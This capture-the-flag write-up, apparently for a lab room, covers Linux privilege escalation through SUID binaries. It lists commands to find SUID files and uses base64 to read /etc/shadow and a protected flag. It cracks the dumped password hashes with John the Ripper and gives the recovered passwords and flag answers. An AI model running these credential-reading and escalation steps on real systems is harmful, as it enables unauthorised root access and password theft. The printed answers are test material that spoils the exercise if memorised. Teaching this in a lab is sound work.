Linux privilege escalation often exploits file permissions, particularly SUID (Set-user ID) and SGID (Set-group ID) bits. 
These allow files to be executed with the privileges of their owner or group, respectively.
#### Finding SUID Binaries
- Use: find / -type f -perm -04000 -ls 2>/dev/null to list SUID/SGID files.
- Check GTFOBins (GTFOBins SUID List) for known exploits.

1. Reading /etc/ shadow
   - If a SUID binary (e.g., nano) allows file editing as root, it can be used to read /etc/ shadow.
   - Extract password hashes and use John the Ripper to crack them.
2. Adding a Root User
   - Generate a password hash using openssl.
   - Add a new user entry in /etc/ passwd with root privileges (/bin/bash).
   - Switch to the new user to gain root access.
These techniques demonstrate how misconfigured SUID files can be exploited for privilege escalation. Now, the challenge is to find another vulnerable binary and apply these skills!
### Q 1: Which user shares the name of a great comic book writer?
To find the users, we can run the ```cat /etc/passwd``` command.

In the bottom 4th ```gerryconway:x:1001:1001::/home/gerryconway:/bin/sh```

The answer must be gerryconway, a famous Marvel Comics writer (among other things, the co-creator of the Punisher!).
### Answer: gerryconway

### Q 2: What is the password of user2?
Before we start, on your local machine's Desktop, create a suid folder with the following files: **passwd.txt** and **shadow.txt**. 
Make sure you have the rockyou.txt file from previous labs in your /wordlists folder.

First we will need to find the password hashes for our **passwd.txt** file. Run the ```base64 /etc/passwd | base64 --decode``` command in terminal and 
copy the last bit Into our **passwd.txt** file. 
```
gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
user2:x:1002:1002::/home/user2:/bin/sh
```

Next we will need to find the password hashes for our shadow.txt file. Run the ```base64 /etc/shadow | base64 --decode``` command in your terminal and copy the last bit into your **shadow.txt** file.

```
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
```

Next, we need to unshadow our passwords. enter the ```unshadow passwd.txt shadow.txt > passwords.txt```. Our **passwords.txt** has been created.

Now we can use john to crack this passwords.txt file. Do so by running the following command: ```john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt```

This will start cracking the hashes, And there we found the password!
```
Password1        (user2)     
test123          (gerryconway)     
```
### Answer: Password1
### Q 3: What is the content of the flag3.txt file?
Now look for the flag: ```find / -name flag3.txt 2>/dev/null```. 

Result shows ```/home/ubuntu/flag3.txt```.
If we cat text file, got an error:
```
$ cat /home/ubuntu/flag3.txt
cat: /home/ubuntu/flag3.txt: Permission denied
```
I tried reading it, but I couldn’t!. I guess we need to use the old trick:

```base64 /home/ubuntu/flag3.txt | base64 --decode```

There we go!
### Answer: THM-3847834
